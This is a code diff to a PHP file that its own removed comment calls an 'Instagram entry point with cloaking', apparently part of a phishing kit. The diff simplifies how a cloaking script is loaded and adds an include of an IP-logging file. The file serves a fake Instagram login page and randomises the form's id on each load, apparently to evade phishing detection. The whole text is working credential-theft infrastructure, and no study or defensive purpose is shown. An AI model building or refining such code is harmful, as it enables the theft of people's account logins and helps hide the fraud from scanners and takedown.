@@ -1,21 +1,15 @@
 <?php
-/**
- * Instagram entry point with cloaking
- */
-
-$possible_paths = [
-    __DIR__ . '/../../../.sites/_cloak.php',
-    __DIR__ . '/../_cloak.php',
-    __DIR__ . '/../../.sites/_cloak.php',
-];
-
-foreach ($possible_paths as $path) {
-    if (file_exists($path)) {
-        require_once $path;
-        break;
-    }
+$cloak_path = __DIR__ . '/../_cloak.php';
+if (file_exists($cloak_path)) {
+    require_once $cloak_path;
 }
 
+$ip_path = __DIR__ . '/ip.php';
+if (file_exists($ip_path)) {
+    include $ip_path;
+}
+
+// Dynamic page serving
 $html = file_get_contents(__DIR__ . '/login.html');
 $suffix = substr(md5(time() . rand()), 0, 6);
 $html = str_replace('id="ig-form"', 'id="ig-' . $suffix . '"', $html);
